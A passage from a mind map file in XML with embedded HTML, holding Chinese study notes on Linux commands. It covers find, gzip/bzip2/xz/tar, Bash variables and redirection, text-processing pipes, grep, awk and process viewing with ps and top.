-r：正则表达式</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1054755291" CREATED="1754750449003" MODIFIED="1754750449005"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. find
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 4. find" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#4-find">
</a>
    <p dir="auto">
      文件搜索。可以使用文件的属性和权限进行搜索。
    </p>
    <pre>## find [basedir] [option]
example: find . -name &quot;shadow*&quot;</pre>
    <p dir="auto">
      <strong>① 与时间有关的选项</strong>
    </p>
    <pre>-mtime  n ：列出在 n 天前的那一天修改过内容的文件
-mtime +n ：列出在 n 天之前 (不含 n 天本身) 修改过内容的文件
-mtime -n ：列出在 n 天之内 (含 n 天本身) 修改过内容的文件
-newer file ： 列出比 file 更新的文件</pre>
    <p dir="auto">
      +4、4 和 -4 的指示的时间范围如下：
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/7bab16f07c942486c05fe78575d10308518fbdd7157d65eeefbc37eb6a01ba97/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f36353866633565372d373963302d343234372d393434352d6436396266313934633533392e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/7bab16f07c942486c05fe78575d10308518fbdd7157d65eeefbc37eb6a01ba97/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f36353866633565372d373963302d343234372d393434352d6436396266313934633533392e706e67" width="" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/658fc5e7-79c0-4247-9445-d69bf194c539.png"/>
    </a><br/>
    

    <p dir="auto">
      <strong>② 与文件拥有者和所属群组有关的选项</strong>
    </p>
    <pre>-uid n
-gid n
-user name
-group name
-nouser ：搜索拥有者不存在 /etc/passwd 的文件
-nogroup：搜索所属群组不存在于 /etc/group 的文件</pre>
    <p dir="auto">
      <strong>③ 与文件权限和名称有关的选项</strong>
    </p>
    <pre>-name filename
-size [+-]SIZE：搜寻比 SIZE 还要大 (+) 或小 (-) 的文件。这个 SIZE 的规格有：c: 代表 byte，k: 代表 1024bytes。所以，要找比 50KB 还要大的文件，就是 -size +50k
-type TYPE
-perm mode  ：搜索权限等于 mode 的文件
-perm -mode ：搜索权限包含 mode 的文件
-perm /mode ：搜索权限包含任一 mode 的文件</pre>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node FOLDED="true" ID="ID_1012912122" CREATED="1754750449005" MODIFIED="1754750449005"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      六、压缩与打包
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_63817721" CREATED="1754750449007" MODIFIED="1754750449009"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      压缩文件名
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 压缩文件名" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#压缩文件名">
</a>
    <p dir="auto">
      Linux 底下有很多压缩文件名，常见的如下：
    </p>
    <markdown-accessiblity-table data-catalyst=""/>
    

    <table>
      <tr>
        <th>
          扩展名
        </th>
        <th>
          压缩程序
        </th>
      </tr>
      <tr>
        <td>
          *.Z
        </td>
        <td>
          compress
        </td>
      </tr>
      <tr>
        <td>
          *.zip
        </td>
        <td>
          zip
        </td>
      </tr>
      <tr>
        <td>
          *.gz
        </td>
        <td>
          gzip
        </td>
      </tr>
      <tr>
        <td>
          *.bz2
        </td>
        <td>
          bzip2
        </td>
      </tr>
      <tr>
        <td>
          *.xz
        </td>
        <td>
          xz
        </td>
      </tr>
      <tr>
        <td>
          *.tar
        </td>
        <td>
          tar 程序打包的数据，没有经过压缩
        </td>
      </tr>
      <tr>
        <td>
          *.tar.gz
        </td>
        <td>
          tar 程序打包的文件，经过 gzip 的压缩
        </td>
      </tr>
      <tr>
        <td>
          *.tar.bz2
        </td>
        <td>
          tar 程序打包的文件，经过 bzip2 的压缩
        </td>
      </tr>
      <tr>
        <td>
          *.tar.xz
        </td>
        <td>
          tar 程序打包的文件，经过 xz 的压缩
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_1488926906" CREATED="1754750449010" MODIFIED="1754750449010"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      压缩指令
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1497244500" CREATED="1754750449012" MODIFIED="1754750449014"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. gzip
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. gzip" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#1-gzip">
</a>
    <p dir="auto">
      gzip 是 Linux 使用最广的压缩指令，可以解开 compress、zip 与 gzip 所压缩的文件。
    </p>
    <p dir="auto">
      经过 gzip 压缩过，源文件就不存在了。
    </p>
    <p dir="auto">
      有 9 个不同的压缩等级可以使用。
    </p>
    <p dir="auto">
      可以使用 zcat、zmore、zless 来读取压缩文件的内容。
    </p>
    <pre>$ gzip [-cdtv#] filename
-c ：将压缩的数据输出到屏幕上
-d ：解压缩
-t ：检验压缩文件是否出错
-v ：显示压缩比等信息
-# ： # 为数字的意思，代表压缩等级，数字越大压缩比越高，默认为 6</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_902582123" CREATED="1754750449014" MODIFIED="1754750449016"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. bzip2
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. bzip2" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#2-bzip2">
</a>
    <p dir="auto">
      提供比 gzip 更高的压缩比。
    </p>
    <p dir="auto">
      查看命令：bzcat、bzmore、bzless、bzgrep。
    </p>
    <pre>$ bzip2 [-cdkzv#] filename
-k ：保留源文件</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1689788272" CREATED="1754750449017" MODIFIED="1754750449018"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. xz
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. xz" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#3-xz">
</a>
    <p dir="auto">
      提供比 bzip2 更佳的压缩比。
    </p>
    <p dir="auto">
      可以看到，gzip、bzip2、xz 的压缩比不断优化。不过要注意的是，压缩比越高，压缩的时间也越长。
    </p>
    <p dir="auto">
      查看命令：xzcat、xzmore、xzless、xzgrep。
    </p>
    <pre>$ xz [-dtlkc#] filename</pre>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_1031615408" CREATED="1754750449019" MODIFIED="1754750449021"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      打包
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 打包" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#打包">
</a>
    <p dir="auto">
      压缩指令只能对一个文件进行压缩，而打包能够将多个文件打包成一个大文件。tar 不仅可以用于打包，也可以使用 gzip、bzip2、xz 将打包文件进行压缩。
    </p>
    <pre>$ tar [-z|-j|-J] [cv] [-f 新建的 tar 文件] filename...  ==打包压缩
$ tar [-z|-j|-J] [tv] [-f 已有的 tar 文件]              ==查看
$ tar [-z|-j|-J] [xv] [-f 已有的 tar 文件] [-C 目录]    ==解压缩
-z ：使用 zip；
-j ：使用 bzip2；
-J ：使用 xz；
-c ：新建打包文件；
-t ：查看打包文件里面有哪些文件；
-x ：解打包或解压缩的功能；
-v ：在压缩/解压缩的过程中，显示正在处理的文件名；
-f : filename：要处理的文件；
-C 目录 ： 在特定目录解压缩。</pre>
    <markdown-accessiblity-table data-catalyst=""/>
    

    <table>
      <tr>
        <th>
          使用方式
        </th>
        <th>
          命令
        </th>
      </tr>
      <tr>
        <td>
          打包压缩
        </td>
        <td>
          tar -jcv -f filename.tar.bz2 要被压缩的文件或目录名称
        </td>
      </tr>
      <tr>
        <td>
          查 看
        </td>
        <td>
          tar -jtv -f filename.tar.bz2
        </td>
      </tr>
      <tr>
        <td>
          解压缩
        </td>
        <td>
          tar -jxv -f filename.tar.bz2 -C 要解压缩的目录
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_267442255" CREATED="1754750449021" MODIFIED="1754750449023"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      七、Bash
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 七、Bash" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#七bash">
</a>
    <p dir="auto">
      可以通过 Shell 请求内核提供服务，Bash 正是 Shell 的一种。
    </p>
  </body>
</html></richcontent>
<node ID="ID_1540068645" CREATED="1754750449023" MODIFIED="1754750449025"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      特性
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 特性" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#特性">
</a>
    <ul dir="auto">
      <li>
        命令历史：记录使用过的命令
      </li>
      <li>
        命令与文件补全：快捷键：tab
      </li>
      <li>
        命名别名：例如 ll 是 ls -al 的别名
      </li>
      <li>
        shell scripts
      </li>
      <li>
        通配符：例如 ls -l /usr/bin/X* 列出 /usr/bin 下面所有以 X 开头的文件
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_56758297" CREATED="1754750449025" MODIFIED="1754750449027"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      变量操作
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 变量操作" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#变量操作">
</a>
    <p dir="auto">
      对一个变量赋值直接使用 =。
    </p>
    <p dir="auto">
      对变量取用需要在变量前加上 $ ，也可以用 ${} 的形式；
    </p>
    <p dir="auto">
      输出变量使用 echo 命令。
    </p>
    <pre>$ x=abc
$ echo $x
$ echo ${x}</pre>
    <p dir="auto">
      变量内容如果有空格，必须使用双引号或者单引号。
    </p>
    <ul dir="auto">
      <li>
        双引号内的特殊字符可以保留原本特性，例如 x=&quot;lang is $LANG&quot;，则 x 的值为 lang is zh_TW.UTF-8；
      </li>
      <li>
        单引号内的特殊字符就是特殊字符本身，例如 x='lang is $LANG'，则 x 的值为 lang is $LANG。
      </li>
    </ul>
    <p dir="auto">
      可以使用 `指令` 或者 <math-renderer class="js-inline-math" data-run-id="0e2db8ebf9d48e9a64f8858a79dfbce6">&#xa0;&#xa0;$(指令) 的方式将指令的执行结果赋值给变量。例如 version=$ </math-renderer>(uname -r)，则 version 的值为 4.15.0-22-generic。
    </p>
    <p dir="auto">
      可以使用 export 命令将自定义变量转成环境变量，环境变量可以在子程序中使用，所谓子程序就是由当前 Bash 而产生的子 Bash。
    </p>
    <p dir="auto">
      Bash 的变量可以声明为数组和整数数字。注意数字类型没有浮点数。如果不进行声明，默认是字符串类型。变量的声明使用 declare 命令：
    </p>
    <pre>$ declare [-aixr] variable
-a ： 定义为数组类型
-i ： 定义为整数类型
-x ： 定义为环境变量
-r ： 定义为 readonly 类型</pre>
    <p dir="auto">
      使用 [ ] 来对数组进行索引操作：
    </p>
    <pre>$ array[1]=a
$ array[2]=b
$ echo ${array[1]}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1190273103" CREATED="1754750449027" MODIFIED="1754750449029"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      指令搜索顺序
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 指令搜索顺序" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#指令搜索顺序">
</a>
    <ul dir="auto">
      <li>
        以绝对或相对路径来执行指令，例如 /bin/ls 或者 ./ls ；
      </li>
      <li>
        由别名找到该指令来执行；
      </li>
      <li>
        由 Bash 内置的指令来执行；
      </li>
      <li>
        按 $PATH 变量指定的搜索路径的顺序找到第一个指令来执行。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_956736219" CREATED="1754750449030" MODIFIED="1754750449032"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      数据流重定向
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 数据流重定向" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#数据流重定向">
</a>
    <p dir="auto">
      重定向指的是使用文件代替标准输入、标准输出和标准错误输出。
    </p>
    <markdown-accessiblity-table data-catalyst=""/>
    

    <table>
      <tr>
        <th>
          1
        </th>
        <th>
          代码
        </th>
        <th>
          运算符
        </th>
      </tr>
      <tr>
        <td>
          标准输入 (stdin)
        </td>
        <td>
          0
        </td>
        <td>
          &lt; 或 &lt;&lt;
        </td>
      </tr>
      <tr>
        <td>
          标准输出 (stdout)
        </td>
        <td>
          1
        </td>
        <td>
          &gt; 或 &gt;&gt;
        </td>
      </tr>
      <tr>
        <td>
          标准错误输出 (stderr)
        </td>
        <td>
          2
        </td>
        <td>
          2&gt; 或 2&gt;&gt;
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>    

    <p dir="auto">
      其中，有一个箭头的表示以覆盖的方式重定向，而有两个箭头的表示以追加的方式重定向。
    </p>
    <p dir="auto">
      可以将不需要的标准输出以及标准错误输出重定向到 /dev/null，相当于扔进垃圾箱。
    </p>
    <p dir="auto">
      如果需要将标准输出以及标准错误输出同时重定向到一个文件，需要将某个输出转换为另一个输出，例如 2&gt;&amp;1 表示将标准错误输出转换为标准输出。
    </p>
    <pre>$ find /home -name .bashrc &gt; list 2&gt;&amp;1</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_308996417" CREATED="1754750449032" MODIFIED="1754750449034"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      八、管道指令
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 八、管道指令" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#八管道指令">
</a>
    <p dir="auto">
      管道是将一个命令的标准输出作为另一个命令的标准输入，在数据需要经过多个步骤的处理之后才能得到我们想要的内容时就可以使用管道。
    </p>
    <p dir="auto">
      在命令之间使用 | 分隔各个管道命令。
    </p>
    <pre>$ ls -al /etc | less</pre>
  </body>
</html></richcontent>
<node ID="ID_1345110743" CREATED="1754750449034" MODIFIED="1754750449036"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      提取指令
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 提取指令" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#提取指令">
</a>
    <p dir="auto">
      cut 对数据进行切分，取出想要的部分。
    </p>
    <p dir="auto">
      切分过程一行一行地进行。
    </p>
    <pre>$ cut
-d ：分隔符
-f ：经过 -d 分隔后，使用 -f n 取出第 n 个区间
-c ：以字符为单位取出区间</pre>
    <p dir="auto">
      示例 1：last 显示登入者的信息，取出用户名。
    </p>
    <pre>$ last
root pts/1 192.168.201.101 Sat Feb 7 12:35 still logged in
root pts/1 192.168.201.101 Fri Feb 6 12:13 - 18:46 (06:33)
root pts/1 192.168.201.254 Thu Feb 5 22:37 - 23:53 (01:16)
$ last | cut -d ' ' -f 1</pre>
    <p dir="auto">
      示例 2：将 export 输出的信息，取出第 12 字符以后的所有字符串。
    </p>
    <pre>$ export
declare -x HISTCONTROL=&quot;ignoredups&quot;
declare -x HISTSIZE=&quot;1000&quot;
declare -x HOME=&quot;/home/dmtsai&quot;
declare -x HOSTNAME=&quot;study.centos.vbird&quot;
.....(其他省略).....
$ export | cut -c 12-</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_60691965" CREATED="1754750449037" MODIFIED="1754750449039"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      排序指令
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 排序指令" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#排序指令">
</a>
    <p dir="auto">
      <strong>sort</strong>&#xa0;用于排序。
    </p>
    <pre>$ sort [-fbMnrtuk] [file or stdin]
-f ：忽略大小写
-b ：忽略最前面的空格
-M ：以月份的名字来排序，例如 JAN，DEC
-n ：使用数字
-r ：反向排序
-u ：相当于 unique，重复的内容只出现一次
-t ：分隔符，默认为 tab
-k ：指定排序的区间</pre>
    <p dir="auto">
      示例：/etc/passwd 文件内容以 : 来分隔，要求以第三列进行排序。
    </p>
    <pre>$ cat /etc/passwd | sort -t ':' -k 3
root:x:0:0:root:/root:/bin/bash
dmtsai:x:1000:1000:dmtsai:/home/dmtsai:/bin/bash
alex:x:1001:1002::/home/alex:/bin/bash
arod:x:1002:1003::/home/arod:/bin/bash</pre>
    <p dir="auto">
      <strong>uniq</strong>&#xa0;可以将重复的数据只取一个。
    </p>
    <pre>$ uniq [-ic]
-i ：忽略大小写
-c ：进行计数</pre>
    <p dir="auto">
      示例：取得每个人的登录总次数
    </p>
    <pre>$ last | cut -d ' ' -f 1 | sort | uniq -c
1
6 (unknown
47 dmtsai
4 reboot
7 root
1 wtmp</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_342150670" CREATED="1754750449039" MODIFIED="1754750449041"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      双向输出重定向
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 双向输出重定向" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#双向输出重定向">
</a>
    <p dir="auto">
      输出重定向会将输出内容重定向到文件中，而 <strong>tee</strong>&#xa0;不仅能够完成这个功能，还能保留屏幕上的输出。也就是说，使用 tee 指令，一个输出会同时传送到文件和屏幕上。
    </p>
    <pre>$ tee [-a] file</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_889085592" CREATED="1754750449041" MODIFIED="1754750449044"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      字符转换指令
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 字符转换指令" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#字符转换指令">
</a>
    <p dir="auto">
      <strong>tr</strong>&#xa0;用来删除一行中的字符，或者对字符进行替换。
    </p>
    <pre>$ tr [-ds] SET1 ...
-d ： 删除行中 SET1 这个字符串</pre>
    <p dir="auto">
      示例，将 last 输出的信息所有小写转换为大写。
    </p>
    <pre>$ last | tr '[a-z]' '[A-Z]'</pre>
    <p dir="auto">
      <strong>col</strong>&#xa0;将 tab 字符转为空格字符。
    </p>
    <pre>$ col [-xb]
-x ： 将 tab 键转换成对等的空格键</pre>
    <p dir="auto">
      <strong>expand</strong>&#xa0;将 tab 转换一定数量的空格，默认是 8 个。
    </p>
    <pre>$ expand [-t] file
-t ：tab 转为空格的数量</pre>
    <p dir="auto">
      <strong>join</strong>&#xa0;将有相同数据的那一行合并在一起。
    </p>
    <pre>$ join [-ti12] file1 file2
-t ：分隔符，默认为空格
-i ：忽略大小写的差异
-1 ：第一个文件所用的比较字段
-2 ：第二个文件所用的比较字段</pre>
    <p dir="auto">
      <strong>paste</strong>&#xa0;直接将两行粘贴在一起。
    </p>
    <pre>$ paste [-d] file1 file2
-d ：分隔符，默认为 tab</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_973515300" CREATED="1754750449045" MODIFIED="1754750449047"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      分区指令
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 分区指令" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#分区指令">
</a>
    <p dir="auto">
      <strong>split</strong>&#xa0;将一个文件划分成多个文件。
    </p>
    <pre>$ split [-bl] file PREFIX
-b ：以大小来进行分区，可加单位，例如 b, k, m 等
-l ：以行数来进行分区。
- PREFIX ：分区文件的前导名称</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1728446577" CREATED="1754750449047" MODIFIED="1754750449047"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      九、正则表达式
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_634823064" CREATED="1754750449049" MODIFIED="1754750449051"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      grep
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: grep" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#grep">
</a>
    <p dir="auto">
      g/re/p（globally search a regular expression and print)，使用正则表示式进行全局查找并打印。
    </p>
    <pre>$ grep [-acinv] [--color=auto] 搜寻字符串 filename
-c ： 统计匹配到行的个数
-i ： 忽略大小写
-n ： 输出行号
-v ： 反向选择，也就是显示出没有 搜寻字符串 内容的那一行
--color=auto ：找到的关键字加颜色显示</pre>
    <p dir="auto">
      示例：把含有 the 字符串的行提取出来（注意默认会有 --color=auto 选项，因此以下内容在 Linux 中有颜色显示 the 字符串）
    </p>
    <pre>$ grep -n 'the' regular_express.txt
8:I can't finish the test.
12:the symbol '*' is represented as start.
15:You are the best is mean you are the no. 1.
16:The world Happy is the same with &quot;glad&quot;.
18:google is the best tools for search keyword</pre>
    <p dir="auto">
      示例：正则表达式 a{m,n} 用来匹配字符 a m~n 次，这里需要将 { 和 } 进行转义，因为它们在 shell 是有特殊意义的。
    </p>
    <pre>$ grep -n 'a\{2,5\}' regular_express.txt</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_220866227" CREATED="1754750449052" MODIFIED="1754750449054"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      printf
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: printf" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#printf">
</a>
    <p dir="auto">
      用于格式化输出。它不属于管道命令，在给 printf 传数据时需要使用 $( ) 形式。
    </p>
    <pre>$ printf '%10s %5i %5i %5i %8.2f \n' $(cat printf.txt)
    DmTsai    80    60    92    77.33
     VBird    75    55    80    70.00
       Ken    60    90    70    73.33</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1172477594" CREATED="1754750449054" MODIFIED="1754750449056"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      awk
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: awk" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#awk">
</a>
    <p dir="auto">
      是由 Alfred Aho，Peter Weinberger 和 Brian Kernighan 创造，awk 这个名字就是这三个创始人名字的首字母。
    </p>
    <p dir="auto">
      awk 每次处理一行，处理的最小单位是字段，每个字段的命名方式为：$n，n 为字段号，从 1 开始，$0 表示一整行。
    </p>
    <p dir="auto">
      示例：取出最近五个登录用户的用户名和 IP。首先用 last -n 5 取出用最近五个登录用户的所有信息，可以看到用户名和 IP 分别在第 1 列和第 3 列，我们用 $1 和 $3 就能取出这两个字段，然后用 print 进行打印。
    </p>
    <pre>$ last -n 5
dmtsai pts/0 192.168.1.100 Tue Jul 14 17:32 still logged in
dmtsai pts/0 192.168.1.100 Thu Jul 9 23:36 - 02:58 (03:22)
dmtsai pts/0 192.168.1.100 Thu Jul 9 17:23 - 23:36 (06:12)
dmtsai pts/0 192.168.1.100 Thu Jul 9 08:02 - 08:17 (00:14)
dmtsai tty1 Fri May 29 11:55 - 12:11 (00:15)</pre>
    <pre>$ last -n 5 | awk '{print $1 &quot;\t&quot; $3}'
dmtsai   192.168.1.100
dmtsai   192.168.1.100
dmtsai   192.168.1.100
dmtsai   192.168.1.100
dmtsai   Fri</pre>
    <p dir="auto">
      可以根据字段的某些条件进行匹配，例如匹配字段小于某个值的那一行数据。
    </p>
    <pre>$ awk '条件类型 1 {动作 1} 条件类型 2 {动作 2} ...' filename</pre>
    <p dir="auto">
      示例：/etc/passwd 文件第三个字段为 UID，对 UID 小于 10 的数据进行处理。
    </p>
    <pre lang="text" class="notranslate">$ cat /etc/passwd | awk 'BEGIN {FS=&quot;:&quot;} $3 &lt; 10 {print $1 &quot;\t &quot; $3}'
root 0
bin 1
daemon 2</pre>
    <p dir="auto">
      awk 变量：
    </p>
    <markdown-accessiblity-table data-catalyst=""/>
    

    <table>
      <tr>
        <th>
          变量名称
        </th>
        <th>
          代表意义
        </th>
      </tr>
      <tr>
        <td>
          NF
        </td>
        <td>
          每一行拥有的字段总数
        </td>
      </tr>
      <tr>
        <td>
          NR
        </td>
        <td>
          目前所处理的是第几行数据
        </td>
      </tr>
      <tr>
        <td>
          FS
        </td>
        <td>
          目前的分隔字符，默认是空格键
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>    

    <p dir="auto">
      示例：显示正在处理的行号以及每一行有多少字段
    </p>
    <pre>$ last -n 5 | awk '{print $1 &quot;\t lines: &quot; NR &quot;\t columns: &quot; NF}'
dmtsai lines: 1 columns: 10
dmtsai lines: 2 columns: 10
dmtsai lines: 3 columns: 10
dmtsai lines: 4 columns: 10
dmtsai lines: 5 columns: 9</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_944851767" CREATED="1754750449056" MODIFIED="1754750449056"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      十、进程管理
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_725828538" CREATED="1754750449058" MODIFIED="1754750449058"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      查看进程
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1672450070" CREATED="1754750449060" MODIFIED="1754750449062"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. ps
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. ps" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#1-ps">
</a>
    <p dir="auto">
      查看某个时间点的进程信息。
    </p>
    <p dir="auto">
      示例：查看自己的进程
    </p>
    <pre>## ps -l</pre>
    <p dir="auto">
      示例：查看系统所有进程
    </p>
    <pre>## ps aux</pre>
    <p dir="auto">
      示例：查看特定的进程
    </p>
    <pre>## ps aux | grep threadx</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1087584966" CREATED="1754750449062" MODIFIED="1754750449064"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. pstree
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. pstree" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#2-pstree">
</a>
    <p dir="auto">
      查看进程树。
    </p>
    <p dir="auto">
      示例：查看所有进程树
    </p>
    <pre>## pstree -A</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_667087835" CREATED="1754750449064" MODIFIED="1754750449066"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. top
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. top" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md#3-top">
</a>
    <p dir="auto">
      实时显示进程信息。
    </p>
    <p dir="auto">
      示例：两秒钟刷新一次
    </p>
    <pre>## top -d 2</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1823186542" CREATED="1754750449066" MODIFIED="1754750449068"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. netstat
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
